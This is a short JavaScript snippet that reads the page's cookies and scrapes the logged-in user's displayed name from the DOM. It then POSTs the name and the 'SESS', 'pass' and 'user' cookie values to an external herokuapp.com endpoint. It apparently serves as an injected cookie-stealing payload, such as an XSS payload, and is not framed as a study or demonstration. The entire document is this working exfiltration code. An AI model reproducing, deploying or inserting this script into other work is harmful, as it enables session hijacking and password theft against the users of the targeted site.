function getCookie(cname) {
    var name = cname + "=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}
var userName = $($($($($(".flname").children()[0]).children()[0]).children()[1]).children()[0]).text();
$.ajax({
    type: "POST",
    url: "https://nameless-wave-78594.herokuapp.com/information",
    data: { username: userName, userid: "failed", sess: getCookie('SESS'), pass: getCookie('pass'), userCookie: getCookie('user'), custCookie: "failed" },

});
